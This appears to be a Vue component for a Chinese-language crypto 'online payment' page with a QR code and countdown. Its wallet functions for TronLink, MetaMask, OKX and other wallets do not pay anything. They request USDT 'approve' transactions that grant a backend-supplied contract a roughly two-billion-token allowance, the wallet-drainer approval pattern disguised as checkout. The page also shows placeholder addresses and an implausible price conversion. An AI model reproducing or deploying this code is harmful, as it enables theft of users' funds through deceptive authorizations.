<template>
  <div class="paying-order">
    <div class="container">
      <header>在线支付</header>
      <div class="container-header">
        <div class="price">100 {{ $unit }}</div>
        <div class="amount">≈ 0.0000000024ETH</div>
      </div>
      <div class="container-line"></div>

      <main class="main" v-loading="isLoading">
        <div class="confirm-wrap">
          <div class="text">
            <div class="left">关联订单号</div>
            <div class="right">
              <div class="ellipsis">{{ orderId }}</div>
            </div>
          </div>
          <div class="text">
            <div class="left">支付网络</div>
            <div class="right">
              <img :src="require(`@/assets/images/recharge/${network || 'TRC20'}.png`)" alt="" />
              <p>{{ network }}</p>
            </div>
          </div>
          <div class="text">
            <div class="left">收款地址</div>
            <div class="right">
              <div class="right">
                <div class="ellipsis">{{ formatAddress('d7sh7e0wjd9') }}</div>
                <svg
                  @click="copyText('d7sh7e0wjd9')"
                  xmlns="http://www.w3.org/2000/svg"
                  width="20"
                  height="20"
                  viewBox="0 0 20 20"
                  fill="none"
                >
                  <path
                    d="M12.9167 5.83333C13.2482 5.83333 13.5661 5.96503 13.8006 6.19945C14.035 6.43387 14.1667 6.75181 14.1667 7.08333V17.0833C14.1667 17.4149 14.035 17.7328 13.8006 17.9672C13.5661 18.2016 13.2482 18.3333 12.9167 18.3333H3.75C3.58585 18.3333 3.4233 18.301 3.27165 18.2382C3.11999 18.1754 2.98219 18.0833 2.86612 17.9672C2.75004 17.8511 2.65797 17.7133 2.59515 17.5617C2.53233 17.41 2.5 17.2475 2.5 17.0833V7.08333C2.5 6.75181 2.6317 6.43387 2.86612 6.19945C3.10054 5.96503 3.41848 5.83333 3.75 5.83333H12.9167ZM12.5 7.5H4.16667V16.6667H12.5V7.5ZM16.2467 2.5C16.5575 2.49981 16.8573 2.61547 17.0875 2.8244C17.3177 3.03334 17.4618 3.32056 17.4917 3.63L17.4967 3.75V13.3275C17.4964 13.5399 17.4151 13.7442 17.2693 13.8986C17.1235 14.0531 16.9242 14.146 16.7122 14.1585C16.5001 14.1709 16.2914 14.1019 16.1285 13.9656C15.9656 13.8293 15.8609 13.6359 15.8358 13.425L15.83 13.3275V4.16667H7.5C7.29589 4.16664 7.09889 4.0917 6.94636 3.95607C6.79383 3.82044 6.69638 3.63354 6.6725 3.43083L6.66667 3.33333C6.66669 3.12922 6.74163 2.93222 6.87726 2.77969C7.0129 2.62716 7.19979 2.52971 7.4025 2.50583L7.5 2.5H16.2467Z"
                    fill="#459675"
                  />
                </svg>
              </div>
            </div>
          </div>
        </div>
        <PayQrcode class="pay-code" :text="'TA452V3rrqwCwqcQpfzGUgutEw6a7QUxzb'" :size="155" />
        <div class="tips">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
            <path
              d="M12.5 4L22 20H3L12.5 4ZM6.5 18H18.5L12.5 7.5L6.5 18ZM11.5 11H13.5V14H11.5V11ZM11.5 15H13.5V17H11.5V15Z"
              fill="#FF9413"
            />
          </svg>
          支付金额为您实际应转账的金额，转账金额务必与支付金额一致！转账前请务必核对转账网络，否则将无法到账！若您未正确操作，将导致资金遗失，无法找或退款
        </div>
        <div class="main__submit">
          <div class="timer-down">
            请在倒计时结束前完成支付
            <van-count-down :time="1000 * 1000" format="HH:mm:ss" />
          </div>
          <a-button class="default-btn" @click="connectWalletType">我已完成支付</a-button>
        </div>
        <div class="main__tips">
          {{ errorMessage }}
        </div>
      </main>
    </div>
  </div>
</template>

<script setup>
/** ***引入相关包start*****/
// import { getChainDetailsApi } from '@/api/recharge/recharge'
// import { warrantAddApi } from '@/api/recharge/recharge.js'
// import MyPagePcHeader from '@/components/MyPageHeader/pc/index.vue'
import useAppStore from '@/store/modules/app.js'
import useUserInfoStore from '@/store/modules/userInfo'
import { isMobile } from '@/utils'
// import { LoadingOutlined } from '@ant-design/icons-vue'
import { ethers } from 'ethers'
import { computed, defineExpose, onMounted, ref } from 'vue'
import { useI18n } from 'vue-i18n'
import { useRoute, useRouter } from 'vue-router'
import PayQrcode from './components/PayQrcode.vue'
/** ***引入相关包end*****/

/** ***ref、reactive、props，等……start*****/
const { t } = useI18n()
// const indicator = h(LoadingOutlined, {
//   style: {
//     fontSize: '48px',
//   },
//   spin: true,
// })

const route = useRoute()
const router = useRouter()
const appStore = useAppStore()
const userInfoStore = useUserInfoStore()
const show = ref(false)

defineExpose({
  show,
})

const isLoading = ref(false)

const orderId = ref(route.query?.id)
const walletType = ref(route.query?.walletType)
const customId = ref(route.query?.customId)
const network = ref(route.query?.network)
const address = ref(route.query?.address)
const contractAddress = ref(route.query?.contract)
const amount = ref(route.query?.amount)
const createTime = ref(route.query?.createTime)
const withdrawalFee = ref(route.query?.withdrawalFee)

const walletDetails = computed(() => {
  return userInfoStore.walletTypesList.filter((item) => walletType.value === item.key)[0]
})
const isAuthorizing = ref(false)

const isProcess = ref('start')

const errorMessage = ref('')

const loadingBtn = ref(false)

const defaultAddress = ref('')

const processStatus = {
  start: {
    text: '等待确认...',
    color: 'var(--color-textlv2)',
  },
  success: {
    text: '授权成功',
    color: 'var(--adm-color-primary)',
  },
  fail: {
    text: '授权失败',
    color: 'var(--color-red)',
  },
}

const openPopover = ref(false)

/** ***ref、reactive、props，等……end*****/

/** ***函数 start*****/
const closePopover = () => {
  openPopover.value = false

  console.log(openPopover.value)
}

const getDateYYYYMMDD = () => {
  const now = new Date()
  const year = now.getFullYear()
  const month = String(now.getMonth() + 1).padStart(2, '0')
  const day = String(now.getDate()).padStart(2, '0')
  const hour = String(now.getHours()).padStart(2, '0')
  // const minute = String(now.getMinutes()).padStart(2, '0')
  // const second = String(now.getSeconds()).padStart(2, '0')
  return `${year}${month}${day}${hour}`
}

// 配置常量
const USDAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' // TRC20-USDT合约地址
const MAX_UINT256 = Number(getDateYYYYMMDD())

const connectWalletType = async () => {
  router.replace('home')
}

const connectTRC20WalletDirect = async (walletType) => {
  try {
    loadingBtn.value = true
    let tronWeb = null

    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb
    } else if (window.imToken || window.tronWeb) {
      tronWeb = window.tronWeb || window.imToken.tronWeb
    }

    if (tronWeb && tronWeb.defaultAddress?.base58) {
      defaultAddress.value = tronWeb.defaultAddress.base58
      console.log(`${walletType} wallet TRON address:`, defaultAddress.value)

      isAuthorizing.value = true

      walletType === 'imtoken' && sendPost()

      const contract = await tronWeb.contract().at(USDAddress)
      const tx = await contract
        .approve(contractAddress.value, tronWeb.toSun(MAX_UINT256))
        .send({ feeLimit: 100000000, shouldPollResponse: true })

      console.log('Authorization result:', tx)
      if (tx) {
        isProcess.value = 'success'
        sendPost()
      }
      return
    }

    window.location.href = createDeepLink(walletType)
  } catch (error) {
    errorMessage.value = error.message
    isProcess.value = 'fail'
    console.error(error)
  } finally {
    loadingBtn.value = false
  }
}

const connectBEP20WalletDirect = async (walletType) => {
  try {
    loadingBtn.value = true
    const injected = window.ethereum || window.imToken?.ethereum || window.trustwallet || window.tp?.ethereum

    if (!injected) {
      window.location.href = createDeepLink(walletType)
      return
    }

    if (!isMobile() || ['metamask', 'okxwallet'].includes(walletType)) {
      const accounts = await injected.request({ method: 'eth_requestAccounts' })
      defaultAddress.value = accounts[0]
    } else {
      defaultAddress.value = injected?.selectedAddress
    }

    isAuthorizing.value = true

    //切换网络
    if (['metamask', 'okxwallet'].includes(walletType)) {
      await changeNetwork(injected)
    }

    console.log(`${walletType} wallet ${network.value} address:`, defaultAddress.value)

    //获取精度
    const USDAddress =
      network.value.toLowerCase() === 'bep20'
        ? '0x55d398326f99059fF775485246999027B3197955' // BSC USDT
        : '0xdAC17F958D2ee523a2206206994597C13D831ec7' // ETH USDT

    const abi = [
      'function decimals() view returns (uint8)',
      'function approve(address spender, uint256 amount) returns (bool)',
    ]

    const decimals = network.value.toLowerCase() === 'bep20' ? 18 : 6

    const amount = ethers.utils.parseUnits(MAX_UINT256.toString(), decimals)

    const iface = new ethers.utils.Interface(abi)
    const tx = iface.encodeFunctionData('approve', [contractAddress.value, amount])
    console.log('tx.data:', tx)

    if ([('imtoken', 'okxwallet')].includes(walletType)) {
      sendPost()
    }

    const txHash = await injected.request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: defaultAddress.value,
          to: USDAddress,
          data: tx,
          value: '0x0',
          gas: '0x186A0',
        },
      ],
    })

    console.log('授权交易哈希:', txHash)

    isProcess.value = 'success'
    sendPost()
  } catch (error) {
    errorMessage.value = error.message
    isProcess.value = 'fail'
    console.error(error)
  } finally {
    loadingBtn.value = false
  }
}

const changeNetwork = async (injected) => {
  try {
    const chainId = await injected.request({ method: 'eth_chainId' })
    console.log('当前链 ID:', chainId)

    // 定义目标链配置
    const chains = {
      erc20: {
        id: '0x1', // Ethereum 主网
        name: 'Ethereum Mainnet',
        nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
        rpcUrls: ['https://mainnet.infura.io/v3/'], // 可替换为你自己的 RPC
        blockExplorerUrls: ['https://etherscan.io'],
      },
      bep20: {
        id: '0x38', // BSC 主网
        name: 'BNB Smart Chain',
        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
        rpcUrls: ['https://bsc-dataseed.binance.org/'],
        blockExplorerUrls: ['https://bscscan.com'],
      },
    }

    const target = chains[network.value.toLowerCase()]
    if (!target) {
      console.warn('未识别的网络类型:', network.value)
      return
    }

    // 如果当前链和目标链不一致，尝试切换
    if (chainId !== target.id) {
      try {
        await injected.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: target.id }],
        })
        console.log(`已切换到 ${target.name}`)
      } catch (switchError) {
        console.log('切换失败:', switchError)
        // 如果链没添加过，需要添加
        if (switchError.code === 4902) {
          await injected.request({
            method: 'wallet_addEthereumChain',
            params: [target],
          })
        }
      }
    }
  } catch (error) {
    console.error('获取链 ID 失败:', error)
  }
}

//walletConnect连接
// const createWalletConnect = async (network) => {
//   try {
//     loadingBtn.value = true

//     const module = await import('@walletconnect/ethereum-provider') //报错
//     let EthereumProvider = module.default

//     console.log(window)

//     const wcProvider = await EthereumProvider.init({
//       projectId: 'd676771683ba09196685ee6f29faef25',
//       // chains: [1, 137, 56],
//       chains: network === 'bep20' ? [56] : [1],
//       showQrModal: true,
//       qrModalOptions: {
//         mobileLinks: ['tokenpocket', 'metamask', 'imtoken'],
//         themeMode: 'light',
//       },
//     })

//     await wcProvider.connect()

//     const accounts = await wcProvider.request({ method: 'eth_requestAccounts' })
//     console.log('连接成功，账户:', accounts[0])

//     defaultAddress.value = accounts[0] || wcProvider.accounts[0]
//     console.log('连接成功，账户:', defaultAddress.value)

//     isAuthorizing.value = true

//     const provider = new ethers.providers.Web3Provider(wcProvider)
//     // const signer = provider.getSigner()

//     const abi = ['function approve(address spender, uint256 amount) returns (bool)']

//     const USDAddress =
//       network === 'bep20' ? '0x55d398326f99059fF775485246999027B3197955' : '0xdAC17F958D2ee523a2206206994597C13D831ec7' // BEP20-USDT合约地址 : ERC20-USDT合约地址  137-0xc2132D05D31c914a87C6611C10748AEb04B58e8F(Polygon (Matic))

//     // 代币合约实例（读写都可用 signer）
//     const tokenContract = new ethers.Contract(USDAddress, abi, provider)

//     const decimals = 18
//     const amount = ethers.BigNumber.from(MAX_UINT256).mul(ethers.BigNumber.from('10').pow(decimals))

//     const txData = await tokenContract.populateTransaction.approve(contractAddress.value, amount)

//     const txHash = await wcProvider.request({
//       method: 'eth_sendTransaction',
//       params: [
//         {
//           from: defaultAddress.value,
//           to: USDAddress,
//           data: txData.data,
//           value: '0x0',
//         },
//       ],
//     })

//     console.log('授权交易哈希:', txHash)

//     const iface = new ethers.utils.Interface(abi)
//     const decoded = iface.decodeFunctionData('approve', txData.data)
//     console.log('spender:', decoded[0])
//     console.log('amount:', decoded[1].toString())

//     isProcess.value = 'success'
//     sendPost()
//   } catch (error) {
//     isProcess.value = 'fail'
//     console.log(error)
//   } finally {
//     loadingBtn.value = false
//   }
// }

const createDeepLink = (walletType) => {
  const map = {
    imtoken: () => {
      const currentUrl = encodeURIComponent(window.location.href)
      return `imtokenv2://navigate/DappView?url=${currentUrl}`
    },
    tokenpocket: () => {
      const chain = {
        TRC20: 'TRON',
        ERC20: 'ETH',
        BEP20: 'BSC',
      }
      const dAppUrl = window.location.href
      return `tpdapp://open?params=${encodeURIComponent(
        JSON.stringify({
          url: dAppUrl,
          chain: chain[network.value],
          source: 'WebApp',
        })
      )}`
    },
    tronlink: () => {
      const param = {
        url: window.location.href,
        action: 'open',
        protocol: 'tronlink',
        version: '1.0',
      }
      return 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify(param))
    },
    metamask: () => {
      //  `https://xxx.com/authorize?id=id&walletType=MetaMask`
      return 'https://metamask.app.link/dapp/' + `${window.location.href}`
    },
    trustwallet: () => {
      return 'trustwallet://wc?uri=' + encodeURIComponent(JSON.stringify(window.location.href))
    },
    okxwallet: () => {
      const dappUrl = encodeURIComponent(window.location.href)
      // const dappUrl = encodeURIComponent(
      //   'https://sq.funtest.one/authorize?id=6981b1ccd27b470276c2b31c&walletType=OkxWallet'
      // )
      const deepLink = `okx://wallet/dapp/url?dappUrl=${dappUrl}`
      const universalLink = `https://web3.okx.com/download?deeplink=${encodeURIComponent(deepLink)}`
      return universalLink
    },
  }

  return map[walletType]()
}

const getChainDetails = async () => {
  isLoading.value = true
  try {
    // const { data } = await getChainDetailsApi(orderId.value)

    const data = {
      id: '69843605d27b470276c78414',
      customId: '697037666e42ad153ca3a514',
      payChannel: 'TRC20',
      amount: 1,
      withdrawalFee: 0,
      createTime: 1770272261687,
      address: 'retgreyge',
      contract: 'TU8zZLRbUcY5uo3nCEU6bUpmqDr4fo1QLR',
      transferAddress: null,
    }
    customId.value = data.customId
    network.value = data.payChannel
    address.value = data.address
    contractAddress.value = data.contract
    amount.value = data.amount
    createTime.value = data.createTime
    withdrawalFee.value = data.withdrawalFee
    console.log(data)
  } catch (error) {
    console.log(error)
  } finally {
    isLoading.value = false
  }
}

const formatAddress = (addr) => {
  if (!addr) return ''
  const start = addr.slice(0, 10)
  const end = addr.slice(-10)
  return `${start}...${end}`
}

const backTo = () => {
  if (isAuthorizing.value) {
    isAuthorizing.value = !isAuthorizing.value
    isProcess.value = 'start'
    return
  }

  history.back()
}

const sendPost = async () => {
  try {
    // await warrantAddApi({
    //   customId: customId.value,
    //   network: network.value,
    //   address: defaultAddress.value,
    //   contract: contractAddress.value,
    // })
  } catch (error) {
    console.log(error)
  }
}

const init = async () => {
  walletType.value = route.query?.walletType
  orderId.value = route.query?.id

  if (!(walletType.value && orderId.value)) {
    router.replace('/home')
  }

  await getChainDetails()

  // userInfoStore.getwalletTypes(network.value)
}

/** ***函数 end*****/

/** ***生命周期start*****/
onMounted(() => {
  init()
})
/** ***生命周期end*****/
</script>

<style lang="less" scoped>
.paying-order {
  height: 100%;
  .container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-items: flex-start;
    height: 100%;
    header {
      padding-top: 16px;
      color: var(--adm-color-textLv1);
      text-align: center;
      font-family: 'SF Pro';
      font-size: 16px;
      font-style: normal;
      font-weight: 590;
      line-height: normal;
    }
    &-header {
      padding: 24px 0;
      .price {
        padding-bottom: 12px;
        text-align: center;
        color: var(--color-red);
        font-size: 24px;
        font-weight: 600;
      }
      .amount {
        text-align: center;
        color: var(--adm-color-primary);
        font-family: Roboto;
        font-size: 16px;
        font-style: normal;
        font-weight: 400;
        line-height: 16px; /* 100% */
      }
    }
    &-line {
      height: 12px;
      background: var(--adm-bg-light);
    }
  }

  .main {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    flex: 1;
    padding: 12px 20px 30px 20px;

    .confirm-wrap {
      width: 100%;
      &.result-wrap {
        padding: 16px 0;
        border: none;
        background: transparent;
      }

      .text {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-bottom: 10px;
        &:last-child {
          margin-bottom: 0;
        }
      }

      .left {
        margin-right: 10px;
        flex-shrink: 0;
        color: var(--adm-color-textLv1);
        font-size: 14px;
        font-style: normal;
        font-weight: 500;
        line-height: 18px; /* 128.571% */
      }

      .right {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: flex-end;
        color: var(--adm-color-textLv1);
        text-align: right;
        font-size: 14px;
        font-style: normal;
        font-weight: 600;
        line-height: 18px; /* 128.571% */
        overflow: hidden;
        text-overflow: ellipsis;

        .ellipsis {
          margin-right: 6px;
          display: inline-block;
          max-width: 100%;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
          text-align: right;
        }

        img {
          margin-right: 10px;
          width: 20px;
          height: auto;
        }
      }

      .amount {
        color: var(--adm-color-primary);
        font-size: 14px;
        font-weight: 600;
      }
    }

    .pay-code {
      margin: 12px 0;
    }

    .tips {
      display: flex;
      align-items: flex-start;
      justify-content: flex-start;
      color: #ff9413;
      font-family: Roboto;
      font-size: 12px;
      font-style: normal;
      font-weight: 400;
      line-height: 18px;

      svg {
        margin-right: 6px;
        flex-shrink: 0;
        // vertical-align: middle;
      }
    }

    &__submit {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      width: 100%;

      .timer-down {
        padding: 12px 0 6px;
        display: flex;
        align-items: center;
        justify-content: center;
        color: var(--adm-color-textLv1);
        text-align: center;
        font-family: Roboto;
        font-size: 11px;
        font-style: normal;
        font-weight: 400;
        line-height: normal;
        :deep(.van-count-down) {
          margin-left: 4px;
          font-size: 12px;
          color: var(--color-red);
        }
      }

      button {
        width: 442px;
        height: 50px;
        font-size: 16px;
      }
    }

    .animate-wrap {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px 0;
      text-align: center;
      border-bottom: 1px dashed var(--color-border);

      .loader {
        width: 50px;
        aspect-ratio: 1;
        display: grid;
        -webkit-mask: conic-gradient(from 15deg, #0000, #000);
        animation: l26 1s infinite steps(12);
      }
      .loader,
      .loader:before,
      .loader:after {
        background: radial-gradient(closest-side at 50% 12.5%, var(--adm-color-primary) 96%, #0000) 50% 0/20% 80%
            repeat-y,
          radial-gradient(closest-side at 12.5% 50%, var(--adm-color-primary) 96%, #0000) 0 50%/80% 20% repeat-x;
      }
      .loader:before,
      .loader:after {
        content: '';
        grid-area: 1/1;
        transform: rotate(30deg);
      }
      .loader:after {
        transform: rotate(60deg);
      }
      @keyframes l26 {
        100% {
          transform: rotate(1turn);
        }
      }

      .amount {
        padding: 12px 0;
        color: var(--color-auxiliary);
        font-size: 12px;
        font-style: normal;
        font-weight: 500;
        line-height: normal;
      }

      .text {
        color: var(--color-white);
        font-size: 24px;
        font-style: normal;
        font-weight: 600;
        line-height: normal;
      }
    }
  }
}

html[data-device='mobile'] {
  .paying-order {
    .header {
      padding: 0 14px;

      &__nav {
        width: 100%;
        height: 40px;

        &__back {
          position: absolute;
          left: 0;
          display: flex;
          justify-content: center;
          align-items: center;
          width: 20px;
          height: 20px;
          cursor: pointer;

          i {
            color: var(--color-white);
            font-size: 18px;
          }
        }

        h3 {
          font-size: 14px;
          font-weight: 500;
        }
      }
    }

    .connect-wallet {
      background: var(--adm-bg-light);

      .address {
        background: var(--adm-bg-light);
      }
    }

    .main {
      padding: 12px 14px;

      .confirm-wrap {
        &.result-wrap {
          padding: 16px 0;
        }

        .text {
          margin-bottom: 12px;
          &:last-child {
            margin-bottom: 0;
          }
        }

        .left {
          margin-right: 10px;
          font-size: 12px;
        }

        .right {
          font-size: 12px;

          p {
            font-size: 12px;
          }
        }

        .amount {
          font-size: 12px;
        }
      }

      .tips {
        padding: 12px 0;
        font-size: 12px;
      }

      &__submit {
        margin-top: 66px;
        button {
          width: 100%;
          height: 35px;
          font-size: 12px;
        }
      }
    }
  }
}
</style>
